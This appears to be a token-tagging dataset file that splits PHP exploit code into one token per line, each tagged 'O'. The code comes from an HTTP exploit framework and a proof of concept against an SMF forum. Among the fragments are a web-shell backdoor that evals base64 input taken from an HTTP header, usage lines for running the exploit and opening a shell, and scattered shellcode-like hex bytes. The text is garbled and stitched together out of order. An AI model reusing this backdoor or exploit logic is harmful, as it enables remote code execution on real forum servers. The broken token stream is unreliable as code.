xbd O
xe0 O
xe2 O
. O

this- O
> O
formdata O
( O
$ O
formdata O
function O
formdata O
( O
$ O
array O
) O
{ O
$ O
this- O
> O
target O
( O
$ O
array O
[ O
frmdt_url O
] O
) O
; O
$ O
this- O
> O
method O
= O
formdata O
; O
$ O
this- O
> O
data O
if O
( O
! O
isset O
( O
$ O
array O
[ O
frmdt_boundary O
] O
) O
) O
$ O
this- O
> O
boundary O
= O
phpsploit O
; O
else O
$ O
this- O
> O
boundary O
= O
$ O
array O
[ O
frmdt_boundary O
] O
; O
foreach O
( O
$ O
array O
as O
$ O
key O
= O
$ O
value O
) O
{ O
if O
( O
! O
preg_match O
( O
^frmdt_ O
( O
boundary|url O
) O
, O
$ O
key O
) O
) O
{ O
$ O
this- O
> O
data O
.= O
str_repeat O
29 O
) O
. O
$ O
this- O
> O
boundary O
. O

; O
$ O
this- O
> O
data O
array O
[ O
$ O
key O
] O
[ O
frmdt_content O
] O
. O

@ O
access O
public O
@ O
param O
string O
url O
Url O
@ O
param O
string O
data O
PostData O
@ O
return O
string O
$ O
this- O
> O
sock O
( O
) O
@ O
example O
$ O
this- O
> O
post O
function O
post O
( O
$ O
url O
, O
$ O
data O
) O
{ O
$ O
this- O
> O
target O
( O
$ O
url O
) O
; O
$ O
this- O
> O
method O
= O
post O
; O
$ O
this- O
> O
data O
= O
$ O
data O
; O
return O
$ O
this- O
> O
sock O
This O
function O
sends O
the O
formed O
http O
packet O
with O
the O
POST O
method O
using O
the O
multipart/form-data O
enctype O
. O

mysql_connect O
: O
host O
, O
user O
, O
passwd O
$ O
this- O
> O
ssql O
.= O
mysql_connect O
( O
; O
foreach O
( O
array O
( O
host O
, O
user O
, O
passwd O
) O
as O
$ O
key O
) O
{ O
if O
( O
isset O
( O
$ O
sql- O
> O
{ O
var_ O
. O

@ O
access O
public O
@ O
param O
string O
func O
Param O
@ O
example O
$ O
this- O
> O
reset O
( O
header O
example O
$ O
this- O
> O
reset O
( O
cookie O
example O
$ O
this- O
> O
reset O
function O
reset O
( O
$ O
func O
switch O
( O
$ O
func O
) O
{ O
case O
header O
: O
$ O
this- O
> O
header O
= O
array O
( O
) O
; O
break O
; O
case O
cookie O
: O
$ O
this- O
> O
cookie O
= O
array O
( O
) O
; O
break O
; O
default O
: O
$ O
this- O
> O
cookiejar O
this- O
> O
header O
= O
array O
( O
) O
; O
$ O
this- O
> O
cookie O
= O
array O
( O
) O
; O
$ O
this- O
> O
allowredirection O
break O

function O
makeurl O
( O
) O
{ O
$ O
url O
if O
( O
is_object O
( O
$ O
this- O
> O
url O
) O
) O
{ O
$ O
url O
this- O
> O
url O
= O
( O
array O
) O
$ O
this- O
> O
url O
; O
foreach O
( O
$ O
this- O
> O
url O
as O
$ O
key O
= O
$ O
value O
) O
{ O
$ O
url O
.= O
$ O
key O
. O

; O
if O
( O
$ O
exit O
) O
{ O
$ O
this- O
> O
msg O
( O
) O
; O
exit O
function O
usage O
( O
) O
{ O
global O
$ O
argv O
; O
$ O
name O
= O
basename O
( O
$ O
argv O
) O
; O
$ O
this- O
> O
msg O
( O
usage O
: O
php O
. O

xd7 O
x0f O
x82 O
xe0 O
xac O
xd7 O
x3d O
xe8 O
x1c O
x1d O
xad O
x5f O
x6d O
x6c O
. O

x24 O
xd5 O
x34 O
xa1 O
xfe O
x3c O
x1c O
x78 O
x96 O
xd9 O
xfa O
x09 O
x80 O
xa2 O
. O

$ O
this- O
> O
port O

function O
exec O
( O
$ O
cmd O
) O
{ O
if O
( O
$ O
this- O
> O
data O
shell O
= O
str_replace O
( O
< O
CMD O
, O
addslashes O
( O
$ O
cmd O
) O
, O
$ O
this- O
> O
data O
) O
; O
else O
$ O
shell O
= O
$ O
cmd O
; O
$ O
shell O
= O
base64_encode O
( O
$ O
shell O
) O
; O
$ O
packet O
= O
GET O
. O

: O
. O
$ O
this- O
> O
proxypass O
) O
. O

is O
Set O
data O
$ O
infos O
= O
parse_url O
( O
$ O
this- O
> O
url O
) O
; O
$ O
this- O
> O
host O
= O
$ O
infos O
[ O
host O
] O
; O
$ O
this- O
> O
port O
= O
isset O
( O
$ O
infos O
[ O
port O
] O
) O

x8d O
xad O
x26 O
x38 O
x8e O
x63 O
xd7 O
xeb O
x76 O
xdd O
x6d O
xd6 O
x00 O
x1c O
. O

@ O
access O
public O
@ O
param O
integer O
code O
1 O
( O
enabled O
) O
0 O
( O
disabled O
) O
@ O
example O
$ O
this- O
> O
allowredirection O
( O
0 O
) O
@ O
example O
$ O
this- O
> O
allowredirection O
( O
1 O
) O
function O
allowredirection O
( O
$ O
code O
) O
{ O
if O
( O
$ O
code O
0 O
) O
$ O
this- O
> O
allowredirection=FALSE O
; O
elseif O
( O
$ O
code O
1 O
) O
$ O
this- O
> O
allowredirection=TRUE O
This O
function O
is O
called O
if O
allowredirection O
( O
) O
is O
enabled O
. O

The O
package O
is O
installed O
. O

I O
won O
t O
talk O
here O
about O
all O
of O
them O
, O
but O
I O
ll O
explain O
how O
we O
can O
execute O
code O
. O

; O
$ O
this- O
> O
packet O
.= O
$ O
this- O
> O
data O
. O

- O
Code O
: O
if O
( O
isset O
( O
$ O
_SERVER O
[ O
HTTP_SHELL O
print O
1234567890 O
; O
eval O
( O
base64_decode O
( O
$ O
_SERVER O
[ O
HTTP_SHELL O
] O
) O
) O
; O
print O
1234567890 O
; O
exit O
First O
run O
the O
exploit O
like O
this O
: O
eg O
: O
php O
exploit.php O
-url O
-bid O
2 O
-user O
tester O
: O
passwd O
And O
when O
you O
think O
the O
admin O
viewed O
your O
post O
, O
run O
the O
shell O
: O
) O
eg O
: O
php O
exploit.php O
-url O
-shell O
FOR O
EDUCATIONAL O
PURPOSE O
ONLY O
new O
smf_poc O
( O
) O
; O
class O
smf_poc O
{ O
const O
SUBJECT O
= O
hello O
; O
const O
MESSAGE O
= O
dudes O
... O

; O
$ O
this- O
> O
data O
.= O
Content-Disposition O
: O
form-data O
; O
name= O
. O
$ O
key O
. O

x1d O
x8c O
x20 O
x11 O
x92 O
x29 O
x83 O
x27 O
x94 O
x87 O
x25 O
xb0 O
x66 O
xa7 O
. O

This O
program O
is O
distributed O
in O
the O
hope O
that O
it O
will O
be O
useful O
, O
but O
WITHOUT O
ANY O
WARRANTY O
; O
without O
even O
the O
implied O
warranty O
of O
MERCHANTABILITY O
or O
FITNESS O
FOR O
A O
PARTICULAR O
PURPOSE O
. O

x33 O
x77 O
xaa O
xc9 O
x28 O
xd1 O
xee O
xb7 O
x9f O
x99 O
x4c O
x48 O
x8f O
x1f O
. O

. O
$ O
urlarr O
[ O
query O
] O
; O
$ O
this- O
> O
port O
= O
! O
empty O
( O
$ O
urlarr O
[ O
port O
] O
) O

